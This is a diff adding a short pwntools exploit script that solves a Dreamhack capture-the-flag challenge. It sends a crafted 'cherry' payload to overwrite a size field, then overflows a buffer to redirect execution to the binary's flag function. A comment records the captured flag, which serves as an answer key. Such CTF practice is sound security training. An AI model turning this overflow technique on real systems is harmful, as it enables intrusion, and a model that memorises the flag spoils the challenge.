@@ -1,0 +1,27 @@
+from pwn import *
+
+p = remote("host3.dreamhack.games", 18168)
+#p = process("./chall")
+'''
+p = gdb.debug("./chall", gdbscript = 
+b *main + 185
+b *main + 106
+)
+'''
+e = ELF("./chall")
+
+win = e.symbols['flag']
+
+payload = b"cherry"
+payload = payload.ljust(0x18 - 0xC, b"A")
+payload += p32(100)
+
+print(hex(len(payload)))
+
+p.sendafter(b"Menu: ", payload)
+
+payload = b"A" * 0x12 + b"B" * 8 + p64(win)
+p.sendafter(b"cherry?:", payload)
+
+p.interactive()
+#DH{0d88cd8c8c1123b99fb478e60ff081cea9bfecc925d72609ab061b8279c83709}
